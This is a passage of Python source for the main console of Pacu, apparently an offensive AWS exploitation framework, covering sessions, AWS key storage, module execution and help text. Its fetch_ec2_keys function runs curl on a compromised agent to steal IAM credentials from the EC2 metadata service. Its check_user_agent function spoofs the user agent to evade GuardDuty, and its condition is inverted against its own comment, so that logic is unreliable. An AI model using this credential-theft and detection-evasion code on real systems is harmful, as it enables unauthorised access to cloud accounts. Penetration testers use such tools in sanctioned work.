        # Update boto3 and botocore to fetch the latest version of the AWS region_list
        try:
            self.print('  Using pip3 to update botocore, so we have the latest region list...\n')
            subprocess.run(['pip3', 'install', '--upgrade', 'botocore'])
        except:
            try:
                self.print('  pip3 failed, trying pip...\n')
                subprocess.run(['pip', 'install', '--upgrade', 'botocore'])
            except:
                pip = self.input('  Could not use pip3 or pip to update botocore to the latest version. Enter the name of your pip binary or press Ctrl+C to exit: ').strip()
                subprocess.run(['{}'.format(pip), 'install', '--upgrade', 'boto3', 'botocore'])

        path = ''

        try:
            self.print('  Using pip3 to locate botocore on the operating system...\n')
            output = subprocess.check_output('pip3 show botocore')
        except:
            try:
                self.print('  pip3 failed, trying pip...\n')
                output = subprocess.check_output('pip show botocore')
            except:
                path = self.input('  Could not use pip3 or pip to determine botocore\'s location. Enter it now (example: /usr/local/bin/python3.6/lib/dist-packages) or press Ctrl+C to exit: ').strip()

        if path == '':
            # Account for Windows \r and \\ in file path (Windows)
            rows = output.decode('utf-8').replace('\r', '').replace('\\\\', '/').split('\n')
            for row in rows:
                if row.startswith('Location: '):
                    path = row.split('Location: ')[1]

        with open('{}/botocore/data/endpoints.json'.format(path), 'r+') as regions_file:
            endpoints = json.load(regions_file)

        for partition in endpoints['partitions']:
            if partition['partition'] == 'aws':
                regions = dict()
                regions['all'] = list(partition['regions'].keys())
                for service in partition['services']:
                    regions[service] = partition['services'][service]

        with open('modules/service_regions.json', 'w+') as services_file:
            json.dump(regions, services_file, default=str, sort_keys=True)

        self.print('  Region list updated to the latest version!')

    def import_module_by_name(self, module_name, include=()):
        file_path = os.path.join(os.getcwd(), 'modules', module_name, 'main.py')
        if os.path.exists(file_path):
            import_path = 'modules.{}.main'.format(module_name).replace('/', '.').replace('\\', '.')
            module = __import__(import_path, globals(), locals(), include, 0)
            importlib.reload(module)
            return module
        return None

    ###### Some module notes
    # For any argument that needs a value and a region for that value, use the form
    # value@region
    # Arguments that accept multiple values should be comma separated.
    ######
    def exec_module(self, command):
        session = self.get_active_session()
        proxy_settings = self.get_proxy_settings()

        # Run key checks so that if no keys have been set, Pacu doesn't default to
        # the AWSCLI default profile:
        if not session.access_key_id:
            print('  No access key has been set. Not running module.')
            return
        if not session.secret_access_key:
            print('  No secret key has been set. Not running module.')
            return

        module_name = command[1]
        module = self.import_module_by_name(module_name, include=['main', 'module_info'])

        if module is not None:
            # Plaintext Command Log
            self.print('{} ({}): {}'.format(session.access_key_id, time.strftime("%a, %d %b %Y %H:%M:%S", time.gmtime()), ' '.join(command).strip()), output='file', is_cmd=True)

            ## XML Command Log - Figure out how to auto convert to XML
            # self.print('<command>{}</command>'.format(cmd), output_type='xml', output='file')

            if proxy_settings.target_agent is None or proxy_settings.target_agent == []:
                self.print('  Running module {}...'.format(module_name))
            else:
                self.print('  Running module {} on agent at {}...'.format(module_name, proxy_settings.target_agent[0]))

            self.running_module = module.module_info['name']
            self.print('\n    {}\n'.format(module.module_info['description']))

            try:
                module.main(command[2:], self)

            except SystemExit as error:
                self.running_module = None
                exception_type, exception_value, tb = sys.exc_info()
                if 'SIGINT called' in exception_value.args:
                    self.print('^C\nExiting the currently running module.')
                else:
                    traceback_text = '\nTraceback (most recent call last):\n{}{}: {}\n\n'.format(''.join(traceback.format_tb(tb)), str(exception_type), str(exception_value))
                    session, global_data, local_data = self.get_data_from_traceback(tb)
                    self.log_error(
                        traceback_text,
                        exception_info='{}: {}\n\nPacu caught a SystemExit error. This may be due to incorrect module arguments received by argparse in the module itself. Check to see if any required arguments are not being received by the module when it executes.'.format(exception_type, exception_value),
                        session=session,
                        local_data=local_data,
                        global_data=global_data
                    )

            except Exception as error:
                self.running_module = None
                raise

            self.running_module = None
            return

        elif module_name in self.COMMANDS:
            print('Error: "{}" is the name of a Pacu command, not a module. Try using it without "run" or "exec" in front.'.format(module_name))

        else:
            print('Module not found. Is it spelled correctly? Try using the module search function.')
            return

    def display_command_help(self, command_name):
        if command_name == 'proxy':
            self.display_proxy_help()
        elif command_name == 'list' or command_name == 'ls':
            print('\n    list/ls\n        List all modules\n')
        elif command_name == 'search':
            print('\n    search [cat[egory]] <search term>\n        Search the list of available modules by name or category\n')
        elif command_name == 'help':
            print('\n    help\n        Display information about all Pacu commands\n    help <module name>\n        Display information about a module\n')
        elif command_name == 'whoami':
            print('\n    whoami\n        Display information regarding to the active access keys\n')
        elif command_name == 'data':
            print('\n    data\n        Display all data that is stored in this session. Only fields with values will be displayed\n    data <service>|proxy\n        Display all data for a specified service or for PacuProxy in this session\n')
        elif command_name == 'services':
            print('\n    services\n        Display a list of services that have collected data in the current session to use with the "data"\n          command\n')
        elif command_name == 'regions':
            print('\n    regions\n        Display a list of all valid AWS regions\n')
        elif command_name == 'update_regions':
            print('\n    update_regions\n        Run a script to update the regions database to the newest version\n')
        elif command_name == 'set_regions':
            print('\n    set_regions <region> [<region>...]\n        Set the default regions for this session. These space-separated regions will be used for modules where\n          regions are required, but not supplied by the user. The default set of regions is every supported\n          region for the service. Supply "all" to this command to reset the region set to the default of all\n          supported regions\n')
        elif command_name == 'run' or command_name == 'exec':
            print('\n    run/exec <module name>\n        Execute a module\n')
        elif command_name == 'set_keys':
            print('\n    set_keys\n        Add a set of AWS keys to the session and set them as the default\n')
        elif command_name == 'swap_keys':
            print('\n    swap_keys\n        Change the currently active AWS key to another key that has previously been set for this session\n')
        elif command_name == 'exit' or command_name == 'quit':
            print('\n    exit/quit\n        Exit Pacu\n')
        else:
            print('Command or module not found. Is it spelled correctly? Try using the module search function.')
        return

    def display_module_help(self, module_name):
        module = self.import_module_by_name(module_name, include=['module_info', 'parser'])

        if module is not None:
            print('\n{} written by {}.\n'.format(module.module_info['name'], module.module_info['author']))

            if 'prerequisite_modules' in module.module_info and len(module.module_info['prerequisite_modules']) > 0:
                print('Prerequisite Module(s): {}\n'.format(module.module_info['prerequisite_modules']))

            if 'external_dependencies' in module.module_info and len(module.module_info['external_dependencies']) > 0:
                print('External dependencies: {}\n'.format(module.module_info['external_dependencies']))

            parser_help = module.parser.format_help()
            print(parser_help.replace(os.path.basename(__file__), 'exec {}'.format(module.module_info['name']), 1))
            return

        else:
            print('Command or module not found. Is it spelled correctly? Try using the module search function, or "help" to view a list of commands.')
            return

    def list_modules(self, search_term, by_category=False):
        found_modules_by_category = dict()
        current_directory = os.getcwd()
        for root, directories, files in os.walk('{}/modules'.format(current_directory)):
            modules_directory_path = os.path.realpath('{}/modules'.format(current_directory))
            specific_module_directory = os.path.realpath(root)

            # Skip any directories inside module directories.
            if os.path.dirname(specific_module_directory) != modules_directory_path:
                continue
            # Skip the root directory.
            elif modules_directory_path == specific_module_directory:
                continue

            module_name = os.path.basename(root)

            for file in files:
                if file == 'main.py':
                    # Make sure the format is correct
                    module_path = 'modules/{}/main'.format(module_name).replace('/', '.').replace('\\', '.')
                    # Import the help function from the module
                    module = __import__(module_path, globals(), locals(), ['module_info'], 0)
                    importlib.reload(module)
                    category = module.module_info['category']
                    services = module.module_info['services']

                    regions = []
                    for service in services:
                        regions += self.get_regions(service)

                    # Skip modules with no regions in the list of set regions.
                    if len(regions) == 0:
                        continue

                    # Searching for modules by category:
                    if by_category and search_term in category:
                        if category not in found_modules_by_category.keys():
                            found_modules_by_category[category] = list()

                        found_modules_by_category[category].append('  {}'.format(module_name))

                        if search_term:
                            found_modules_by_category[category].append('    {}\n'.format(module.module_info['one_liner']))

                    # Searching or listing modules without specifying a category:
                    elif not by_category and search_term in module_name:
                        if category not in found_modules_by_category.keys():
                            found_modules_by_category[category] = list()

                        found_modules_by_category[category].append('  {}'.format(module_name))

                        if search_term:
                            found_modules_by_category[category].append('    {}\n'.format(module.module_info['one_liner']))

        if found_modules_by_category:
            for key in sorted(found_modules_by_category.keys()):
                search_results = '\n'.join(found_modules_by_category[key]).strip('\n')
                print('\n[Category: {}]\n\n{}'.format(key, search_results))
        else:
            print('\nNo modules found.')
        print('')

    def fetch_ec2_keys(self, target, conn):
        instance_profile = self.server.run_cmd(target, conn, 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/', mute=True)
        if not instance_profile == '' and 'not found' not in instance_profile:
            keys = self.server.run_cmd(target, conn, 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/{}'.format(instance_profile), mute=True)
            if '"Code" : "Success",' in keys:
                keys = json.loads(keys)
                self.set_keys('Agent{}/{}'.format(target, time.strftime("%m-%d@%I-%M%p")), keys['AccessKeyId'], keys['SecretAccessKey'], keys['Token'])
                self.print('Keys successfully fetched from agent {}\'s EC2 meta-data and set as the active key pair. They will expire at {}.\n'.format(target, keys["Expiration"]))
                return
        self.print('Failed to fetch AWS keys from the EC2 meta-data, this agent is either not an EC2 instance or it does not have a valid instance profile attached to it to fetch the keys from.\n')
        return

    def set_keys(self, key_alias=None, access_key_id=None, secret_access_key=None, session_token=None):
        session = self.get_active_session()

        # If key_alias is None, then it's being run normally from the command line (set_keys),
        # otherwise it means it is set programmatically and we don't want any prompts if it is
        # done programatically
        if key_alias is None:
            self.print('Setting AWS Keys. Press enter to keep the value currently stored. Enter the letter C to clear the value, rather than set it. If you enter an existing key_alias, that key\'s fields will be updated with the information provided.')

        # Key alias
        if key_alias is None:
            new_value = self.input('Key alias [{}]: '.format(session.key_alias))
        else:
            new_value = key_alias
            self.print('Key alias [{}]: {}'.format(session.key_alias, new_value), output='file')
        if str(new_value.strip().lower()) == 'c':
            session.key_alias = None
        elif str(new_value) != '':
            session.key_alias = new_value

        # Access key ID
        if key_alias is None:
            new_value = self.input('Access key ID [{}]: '.format(session.access_key_id))
        else:
            new_value = access_key_id
            self.print('Access key ID [{}]: {}'.format(session.access_key_id, new_value), output='file')
        if str(new_value.strip().lower()) == 'c':
            session.access_key_id = None
        elif str(new_value) != '':
            session.access_key_id = new_value

        # Secret access key (should not be entered in log files)
        if key_alias is None:
            new_value = input('Secret access key [{}]: '.format(session.secret_access_key))
        else:
            new_value = secret_access_key
        self.print('Secret access key [******]: ****** (Censored)', output='file')
        if str(new_value.strip().lower()) == 'c':
            session.secret_access_key = None
        elif str(new_value) != '':
            session.secret_access_key = new_value

        # Session token (optional)
        if key_alias is None:
            new_value = self.input('Session token (Optional - for temp AWS keys only) [{}]: '.format(session.session_token))
        else:
            new_value = session_token
            self.print('Access key ID [{}]: {}'.format(session.session_token, new_value), output='file')
        if str(new_value.strip().lower()) == 'c':
            session.session_token = None
        elif str(new_value) != '':
            session.session_token = new_value

        self.database.add(session)

        aws_key = session.get_active_aws_key(self.database)
        if aws_key:
            aws_key.key_alias = session.key_alias
            aws_key.access_key_id = session.access_key_id
            aws_key.secret_access_key = session.secret_access_key
            aws_key.session_token = session.session_token
        else:
            aws_key = AWSKey(
                session=session,
                key_alias=session.key_alias,
                access_key_id=session.access_key_id,
                secret_access_key=session.secret_access_key,
                session_token=session.session_token
            )
        self.database.add(aws_key)

        self.database.commit()

        if key_alias is None:
            self.print('Configuration variables have been set.\n')

    def swap_keys(self):
        session = self.get_active_session()
        aws_keys = session.aws_keys.all()

        if not aws_keys:
            self.print('\nNo AWS keys have been set for this session. Use set_keys to add AWS keys.\n')
            return

        self.print('\nSwapping AWS Keys. Press enter to keep the currently active key.')

        print('AWS keys associated with this session:')

        for index, aws_key in enumerate(aws_keys, 1):
            if aws_key.key_alias == session.key_alias:
                print('  [{}] {} (ACTIVE)'.format(index, aws_key.key_alias))
            else:
                print('  [{}] {}'.format(index, aws_key.key_alias))

        choice = input('Choose an option: ')

        if not str(choice).strip():
            self.print('The currently active AWS key will remain active. ({})'.format(session.key_alias))
            return

        if not choice.isdigit() or int(choice) not in range(1, len(aws_keys) + 1):
            print('Please choose a number from 1 to {}.'.format(len(aws_keys)))
            return self.swap_keys()

        chosen_key = aws_keys[int(choice) - 1]
        session.key_alias = chosen_key.key_alias
        session.access_key_id = chosen_key.access_key_id
        session.secret_access_key = chosen_key.secret_access_key
        session.session_token = chosen_key.session_token
        self.database.add(session)
        self.database.commit()
        self.print('AWS key is now {}.'.format(session.key_alias))

    def check_sessions(self):
        sessions = self.database.query(PacuSession).all()

        if not sessions:
            session = self.new_session()

        else:
            print('Found existing sessions:')
            print('  [0] New session')

            for index, session in enumerate(sessions, 1):
                print('  [{}] {}'.format(index, session.name))

            choice = input('Choose an option: ')

            try:
                if int(choice) == 0:
                    session = self.new_session()
                else:
                    session = sessions[int(choice) - 1]
            except (ValueError, IndexError):
                print('Please choose a number from 0 to {}.'.format(len(sessions)))
                return self.check_sessions()

        session.activate(self.database)

    def new_session(self):
        session_data = dict()
        name = None

        while not name:
            name = input('What would you like to name this new session? ').strip()
            if not name:
                print('A session name is required.')
            else:
                existing_sessions = self.database.query(PacuSession).filter(PacuSession.name == name).all()
                if existing_sessions:
                    print('A session with that name already exists.')
                    name = None

        session_data['name'] = name

        session = PacuSession(**session_data)
        self.database.add(session)
        self.database.commit()

        session_downloads_directory = './sessions/{}/downloads/'.format(name)
        if not os.path.exists(session_downloads_directory):
            os.makedirs(session_downloads_directory)

        print('Session {} created.'.format(name))

        return session

    def get_data_from_traceback(self, tb):
        session = None
        global_data_in_all_frames = list()
        local_data_in_all_frames = list()

        for frame, line_number in traceback.walk_tb(tb):
            global_data_in_all_frames.append(str(frame.f_globals))
            local_data_in_all_frames.append(str(frame.f_locals))

            # Save the most recent PacuSession called "session", working backwards.
            if session is None:
                session = frame.f_locals.get('session', None)
                if not isinstance(session, PacuSession):
                    session = None

        return session, global_data_in_all_frames, local_data_in_all_frames

    def check_user_agent(self):
        session = self.get_active_session()
        
        if session.boto_user_agent is None:  # If there is no user agent set for this session already
            boto3_session = boto3.session.Session()
            ua = boto3_session._session.user_agent()
            if 'kali' not in ua.lower():  # If the local OS is Kali Linux
                # GuardDuty triggers a finding around API calls made from Kali Linux, so let's avoid that...
                self.print('Detected the current operating system as Kali Linux. Modifying user agent to hide that from GuardDuty...')
                with open('./user_agents.txt', 'r') as file:
                    user_agents = file.readlines()
                user_agents = [agent.strip() for agent in user_agents]  # Remove random \n's and spaces
                new_ua = random.choice(user_agents)
                session.update(self.database, boto_user_agent=new_ua)
                self.print('  The user agent for this Pacu session has been set to:')
                self.print('    {}'.format(new_ua))

    def get_boto3_client(self, service, region=None, user_agent=None, socks_port=8001, parameter_validation=True):
        session = self.get_active_session()
        proxy_settings = self.get_proxy_settings()

        # If there is not a custom user_agent passed into this function
        # and session.boto_user_agent is set, use that as the user agent
        # for this client. If both are set, the incoming user_agent will
        # override the session.boto_user_agent. If niether are set, it
        # will be None, and will default to the OS's regular user agent
        if user_agent is None and session.boto_user_agent is not None:
            user_agent = session.boto_user_agent

        boto_config = botocore.config.Config(
            proxies={'https': 'socks5://127.0.0.1:{}'.format(socks_port), 'http': 'socks5://127.0.0.1:{}'.format(socks_port)} if not proxy_settings.target_agent == [] else None,
            user_agent=user_agent,  # If user_agent=None, botocore will use the real UA which is what we want
            parameter_validation=parameter_validation
        )

        return boto3.client(
            service,
            region_name=region,  # Whether region has a value or is None, it will work here
            aws_access_key_id=session.access_key_id,
            aws_secret_access_key=session.secret_access_key,
            aws_session_token=session.session_token,
            config=boto_config
        )

    def get_boto3_resource(self, service, region=None, user_agent=None, socks_port=8001, parameter_validation=True):
        # All the comments from get_boto3_client apply here too
        session = self.get_active_session()
        proxy_settings = self.get_proxy_settings()

        if user_agent is None and session.boto_user_agent is not None:
            user_agent = session.boto_user_agent

        boto_config = botocore.config.Config(
            proxies={'https': 'socks5://127.0.0.1:{}'.format(socks_port), 'http': 'socks5://127.0.0.1:{}'.format(socks_port)} if not proxy_settings.target_agent == [] else None,
            user_agent=user_agent,
            parameter_validation=parameter_validation
        )

        return boto3.resource(
            service,
            region_name=region,
            aws_access_key_id=session.access_key_id,
            aws_secret_access_key=session.secret_access_key,
            aws_session_token=session.session_token,
            config=boto_config
        )

    def initialize_tab_completion(self):
        try:
            import readline
            # Big thanks to samplebias: https://stackoverflow.com/a/5638688
            MODULES = []
            CATEGORIES = []

            for root, directories, files in os.walk('{}/modules'.format(os.getcwd())):
                modules_directory_path = os.path.realpath('{}/modules'.format(os.getcwd()))
                category_path = os.path.realpath(root)

                # Skip any directories inside module directories.
                if os.path.dirname(category_path) != modules_directory_path:
                    continue
                # Skip the root directory.
                elif modules_directory_path == category_path:
                    continue

                for file in files:
                    if file == 'main.py':
                        module_name = os.path.basename(root)
                        MODULES.append(module_name)

                        # Make sure the format is correct
                        module_path = 'modules/{}/main'.format(module_name).replace('/', '.').replace('\\', '.')

                        # Import the help function from the module
                        module = __import__(module_path, globals(), locals(), ['module_info'], 0)
                        importlib.reload(module)
                        CATEGORIES.append(module.module_info['category'])

            RE_SPACE = re.compile('.*\s+$', re.M)
            readline.set_completer_delims(' \t\n`~!@#$%^&*()=+[{]}\\|;:\'",<>/?')

            class Completer(object):
                def complete(completer, text, state):
                    buffer = readline.get_line_buffer()
                    line = readline.get_line_buffer().split()

                    # If nothing has been typed, show all commands. If help, exec, or run has been typed, show all modules
                    if not line:
                        return [c + ' ' for c in self.COMMANDS][state]

                    if len(line) == 1 and (line[0] == 'help'):
                        return [c + ' ' for c in MODULES + self.COMMANDS][state]

                    if len(line) == 1 and (line[0] == 'exec' or line[0] == 'run'):
                        return [c + ' ' for c in MODULES][state]

                    # account for last argument ending in a space
                    if RE_SPACE.match(buffer):
                        line.append('')

                    # Resolve command to the implementation function
                    if len(line) == 1:
                        cmd = line[0].strip()
                        results = [c + ' ' for c in self.COMMANDS if c.startswith(cmd)] + [None]

                    elif len(line) == 2:
                        cmd = line[1].strip()
                        if line[0].strip() == 'search':
                            results = [c + ' ' for c in MODULES + ['category'] if c.startswith(cmd)] + [None]
                        elif line[0].strip() == 'help':
                            results = [c + ' ' for c in MODULES + self.COMMANDS if c.startswith(cmd)] + [None]
                        else:
                            results = [c + ' ' for c in MODULES if c.startswith(cmd)] + [None]

                    elif len(line) == 3 and line[0] == 'search' and line[1] in ('cat', 'category'):
                            cmd = line[2].strip()
                            results = [c + ' ' for c in CATEGORIES if c.startswith(cmd)] + [None]

                    elif len(line) >= 3:
                        if line[0].strip() == 'run' or line[0].strip() == 'exec':
                            module_name = line[1].strip()
                            module = self.import_module_by_name(module_name, include=['module_info'])
                            autocomplete_arguments = module.module_info.get('arguments_to_autocomplete', list())
                            current_argument = line[-1].strip()
                            results = [c + ' ' for c in autocomplete_arguments if c.startswith(current_argument)] + [None]

                    return results[state]

            comp = Completer()
            readline.parse_and_bind("tab: complete")
            readline.set_completer(comp.complete)
        except Exception as error:
            # Error means most likely on Windows where readline is not supported
            # TODO: Implement tab-completion for Windows
            # print(error)
            pass

    def exit(self):
        sys.exit('SIGINT called')

    def idle(self):
        session = self.get_active_session()

        if session.key_alias:
            alias = session.key_alias
        else:
            alias = 'No Keys Set'

        command = input('Pacu ({}:{}) > '.format(session.name, alias))

        self.parse_command(command)

        self.idle()

    def run(self):
        idle_ready = False

        while True:
            try:
                if not idle_ready:
                    print("""
                                                                                    .,*(###((,.
                                                                               ,#&&&&&&&&&&&&&&&&&%*
                                                                             /&&&&&&&&&&&&&&&&&&&&&&&&.
                                                                          *&&&&&&&/.       .*(&&&&&&&&(
                                                                         %&&&&&&%,                (&&&&&&&/
                                                                       .%&&&&                     *&&&&&&*
                                                                      ,#(/**/*                        (&&&&&(
                                                                                                       /&&&&&%#%&&&&&&%#*
                                                                       ..,**//**,..                     /&&&&&&&&&&&&&&&&&&(
                                        .,*/##%%&&&&&&&&&%%#(*,*#%&&&&&&&&&&&&&&&&&&&&&%(*.             .%&&&&&&&&&&&&&&&&&&&/
                                                      .,/#%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&,         ,&&&&/        .#&&&&&&
                                                 ........    ,%&&&&&&&&&&&&&&&&&&&. .*#%&&&&&&&&&%,                      .&&&&&/
                                       .*/////((##%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&.      .*#&&&&&&&.                    (&&&&%
                                                      .#&&&&&&&&&&&&&&&&&&&&&&&&&&&.     .*#&&&&&&&&&&&*                  .&&&&&*
                                          .*#%%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&*                ,&&&&&&%(
                                                 *&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&/,.                         *&&&&&&&&&&&/
                                         .*#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%/.   .,/#%&&&&&&.                  .(%%&&&&&&&&&*
                                              (&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&*   ./#&&&&&&%%&&&&(                         ,#&&&&&&%.
                                            /&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&(.  ./%&&&&&%&&&&  (&/                             *&&&&&&/
                                           ,&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&,  .(&&&&&&&&%. %&&&,   .                                (&&&&&*
                                          *&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&/   .%&&&&&//&&&&%    *.                                      /&&&&&
                                         .%&&&&&&&&&&&&&&&&&&&&&&&&&&&&(   *&&&&&&&&(   #&/                                             &&&&&.
                              *(#%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&*   *&&&&.*%&&&/                                                   &&&&&,
                        *%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&/    (&&&&&.    *                                                    &&&&&,
                     ,%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&         ./%                                                           .&&&&&.
                           ,#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&                                                                       %&&&&%
                              .(&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%.                                                                     .%&&&&&,
                                  *&&&&&&&&&&&&&&&&&&&&&&&&&&%.                                                                    *&&&&&&%.
                                 .(&&&&&&&&&&&&&&&&&&&&&&&&&&&                                  .                            .*#&&&&&&&/
                                (&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&.                 (&/    (&.    &&,     %&&&&&&&&&&&&&&&&&&&&&&&&&&&&%
                              .&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&,           .&&&&% /&&&&/  #&&&/    %&&&&&&&&&&&&&&&&&&&&&&&&,
                              #&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%#/,,,,*&&&&&&&&&&%&&&&&    %&&&&&&&&&&&&&&&&&&&%#(*.
                              &&&&&&&&&&/
                             .&&&&&&&%,   (%%%%%%%%%%%%%%##*          *##%%%%%%%%%%%##*         ,(#%%%%%%%%%%%##,      .#%%%%%%.      #%%%%%%,
                             .&&&&.       #&&&&&&&&&&&&&&&&&&&,     ,&&&&&&&&&&&&&&&&&&&*     *&&&&&&&&&&&&&&&&&&&(    .&&&&&&&,     .%&&&&&&*
                              &&&%.       #&&&&&&&&&&&&&&&&&&&&,   .&&&&&&&&&&&&&&&&&&&&&,   *&&&&&&&&&&&&&&&&&&&&&/   .&&&&&&&,     .%&&&&&&*
                              %&*         #&&&&&&&&&&&&&&&&&&&&&   .&&&&&&&&&&&&&&&&&&&&&,   *&&&&&&&&&&&&&&&&&&&&&(   .&&&&&&&,     .%&&&&&&*
                                          #&&&&&&(      #&&&&&&&   .&&&&&&&.     .&&&&&&&,   *&&&&&&&/     *&&&&&&&(   .&&&&&&&,     .%&&&&&&*
                                          #&&&&&&(      #&&&&&&&   .&&&&&&&.     .&&&&&&&,   *&&&&&&&/     *&&&&&&&(   .&&&&&&&,     .%&&&&&&*
                                          #&&&&&&(      #&&&&&&&   .&&&&&&&.     .&&&&&&&,   *&&&&&&&/     ,#######*   .&&&&&&&,     .%&&&&&&*
                                          #&&&&&&(      #&&&&&&&   .&&&&&&&.     .&&&&&&&,   *&&&&&&&/                 .&&&&&&&,     .%&&&&&&*
                                          #&&&&&&(      #&&&&&&&   .&&&&&&&.     .&&&&&&&,   *&&&&&&&/                 .&&&&&&&,     .%&&&&&&*
                                          #&&&&&&(      #&&&&&&&   .&&&&&&&.     .&&&&&&&,   *&&&&&&&/                 .&&&&&&&,     .%&&&&&&*
                                          #&&&&&&(      #&&&&&&&   .&&&&&&&.     .&&&&&&&,   *&&&&&&&/                 .&&&&&&&,     .%&&&&&&*
                                          #&&&&&&&&&&&&&&&&&&&&&   .&&&&&&&&&&&&&&&&&&&&&,   *&&&&&&&/                 .&&&&&&&,     .%&&&&&&*
                                          #&&&&&&&&&&&&&&&&&&&&%   .&&&&&&&&&&&&&&&&&&&&&,   *&&&&&&&/                 .&&&&&&&,     .%&&&&&&*
                                          #&&&&&&&&&&&&&&&&&&&%.   .&&&&&&&&&&&&&&&&&&&&&,   *&&&&&&&/                 .&&&&&&&,     .%&&&&&&*
                                          #&&&&&&&&&&&&&&&,        .&&&&&&&%%%%%%%&&&&&&&,   *&&&&&&&/     *&&&&&&&(   .&&&&&&&,     .%&&&&&&*
                                          #&&&&&&(                 .&&&&&&&.     .&&&&&&&,   *&&&&&&&/     *&&&&&&&(   .&&&&&&&,     .%&&&&&&*
                                          #&&&&&&(                 .&&&&&&&.     .&&&&&&&,   *&&&&&&&&&&&&&&&&&&&&&(   .&&&&&&&&&&&&&&&&&&&&&*
                                          #&&&&&&(                 .&&&&&&&.     .&&&&&&&,   *&&&&&&&&&&&&&&&&&&&&&(    %&&&&&&&&&&&&&&&&&&&&,
                                          #&&&&&&(                 .&&&&&&&.     .&&&&&&&,   .&&&&&&&&&&&&&&&&&&&&&*    ,&&&&&&&&&&&&&&&&&&&%
                                          #&&&&&&(                 .&&&&&&&.     .&&&&&&&,     *%&&&&&&&&&&&&&&&&/        /%&&&&&&&&&&&&&&(.

                    """)

                    configure_settings.copy_settings_template_into_settings_file_if_not_present()
                    set_sigint_handler(exit_text='\nA database must be created for Pacu to work properly.')
                    setup_database_if_not_present(settings.DATABASE_FILE_PATH)
                    set_sigint_handler(exit_text=None, value='SIGINT called')

                    self.database = get_database_connection(settings.DATABASE_CONNECTION_PATH)
                    self.server = PacuProxy()
                    self.proxy = ProxySettings()
                    self.queue = Queue()

                    self.check_sessions()

                    self.initialize_tab_completion()
                    self.display_pacu_help()

                    proxy_settings = self.get_proxy_settings()
                    if proxy_settings is None:
                        self.proxy.activate(self.database)
                        proxy_settings = self.get_proxy_settings()
                    if proxy_settings is not None and proxy_settings.listening is True:
                        # PacuProxy was listening on last shutdown, so restart it
                        self.print('Auto-starting PacuProxy listener from previous session on {}:{}...'.format(proxy_settings.ip, proxy_settings.port))
                        self.start_proxy()

                    idle_ready = True

                self.check_user_agent()
                self.idle()

            except (Exception, SystemExit) as error:
                exception_type, exception_value, tb = sys.exc_info()

                if exception_type == SystemExit:
                    if 'SIGINT called' in exception_value.args:
                        print('\nBye!')
                        return
                    else:
                        traceback_text = '\nTraceback (most recent call last):\n{}{}: {}\n\n'.format(''.join(traceback.format_tb(tb)), str(exception_type), str(exception_value))
                        session, global_data, local_data = self.get_data_from_traceback(tb)
                        self.log_error(
                            traceback_text,
                            exception_info='{}: {}\n\nPacu caught a SystemExit error. This may be due to incorrect module arguments received by argparse in the module itself. Check to see if any required arguments are not being received by the module when it executes.'.format(exception_type, exception_value),
                            session=session,
                            local_data=local_data,
                            global_data=global_data
                        )
                else:
                    traceback_text = '\nTraceback (most recent call last):\n{}{}: {}\n\n'.format(''.join(traceback.format_tb(tb)), str(exception_type), str(exception_value))
                    session, global_data, local_data = self.get_data_from_traceback(tb)
                    self.log_error(
                        traceback_text,
                        exception_info='{}: {}'.format(exception_type, exception_value),
                        session=session,
                        local_data=local_data,
                        global_data=global_data
                    )

                if not idle_ready:
                    print('Pacu is unable to start. Try copying Pacu\'s sqlite.db file and deleting the old version. If the error persists, try reinstalling Pacu in a new directory.')
                    return


if __name__ == '__main__':
    Main().run()
